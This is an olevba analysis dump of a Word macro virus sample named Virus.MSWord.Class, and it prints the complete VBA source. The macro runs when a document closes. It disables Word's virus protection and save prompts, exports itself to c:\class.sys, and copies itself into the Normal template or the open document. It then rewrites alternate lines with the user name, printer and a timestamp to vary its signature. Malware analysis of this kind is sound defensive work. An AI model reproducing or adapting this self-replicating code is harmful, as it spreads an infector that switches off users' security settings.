olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class-bb0eb951dd366c4bb9a6327850b560b5ebc9771c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class-bb0eb951dd366c4bb9a6327850b560b5ebc9771c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'xLock10.12.04 11:57:3310.12.04 11:57:33
On Error GoTo out
'xLock10.12.04 11:57:3310.12.04 11:57:33
Options.VirusProtection = False
'xLock10.12.04 11:57:3310.12.04 11:57:33
Options.SaveNormalPrompt = False
'xLock10.12.04 11:57:3310.12.04 11:57:33
Options.ConfirmConversions = False
'xLock10.12.04 11:57:3310.12.04 11:57:33
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'xLock10.12.04 11:57:3310.12.04 11:57:33
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'xLock10.12.04 11:57:3310.12.04 11:57:33
If Day(Now) = 31 Then MsgBox "•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•" + Chr$(13) + "•  VicodinES /CB /TNN •" + Chr$(13) + "•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•", 0, "This Is Class"
'xLock10.12.04 11:57:3310.12.04 11:57:33
If nt = 0 Then
'xLock10.12.04 11:57:3310.12.04 11:57:33
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'xLock10.12.04 11:57:3310.12.04 11:57:33
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'xLock10.12.04 11:57:3310.12.04 11:57:33
End If
'xLock10.12.04 11:57:3310.12.04 11:57:33
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'xLock10.12.04 11:57:3310.12.04 11:57:33
If nt > 0 And ad > 0 Then GoTo out
'xLock10.12.04 11:57:3310.12.04 11:57:33
host.codemodule.AddFromFile ("c:\class.sys")
'xLock10.12.04 11:57:3310.12.04 11:57:33
With host.codemodule
'xLock10.12.04 11:57:3310.12.04 11:57:33
    For x = 1 To 4
'xLock10.12.04 11:57:3310.12.04 11:57:33
    .deletelines 1
'xLock10.12.04 11:57:3310.12.04 11:57:33
    Next x
'xLock10.12.04 11:57:3310.12.04 11:57:33
End With
'xLock10.12.04 11:57:3310.12.04 11:57:33
If nt = 0 Then
'xLock10.12.04 11:57:3310.12.04 11:57:33
    With host.codemodule
'xLock10.12.04 11:57:3310.12.04 11:57:33
    .replaceline 1, "Sub AutoClose()"
'xLock10.12.04 11:57:3310.12.04 11:57:33
    .replaceline 69, "Sub ToolsMacro()"
'xLock10.12.04 11:57:3310.12.04 11:57:33
    End With
'xLock10.12.04 11:57:3310.12.04 11:57:33
End If
'xLock10.12.04 11:57:3310.12.04 11:57:33
With host.codemodule
'xLock10.12.04 11:57:3310.12.04 11:57:33
    For x = 2 To 70 Step 2
'xLock10.12.04 11:57:3310.12.04 11:57:33
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Now
'xLock10.12.04 11:57:3310.12.04 11:57:33
    Next x
'xLock10.12.04 11:57:3310.12.04 11:57:33
End With
'xLock10.12.04 11:57:3310.12.04 11:57:33
out:
'xLock10.12.04 11:57:3310.12.04 11:57:33
If nt <> 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'xLock10.12.04 11:57:3310.12.04 11:57:33
End Sub
'xLock10.12.04 11:57:3310.12.04 11:57:33
Sub ToolsMacro()
'xLock10.12.04 11:57:3310.12.04 11:57:33
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

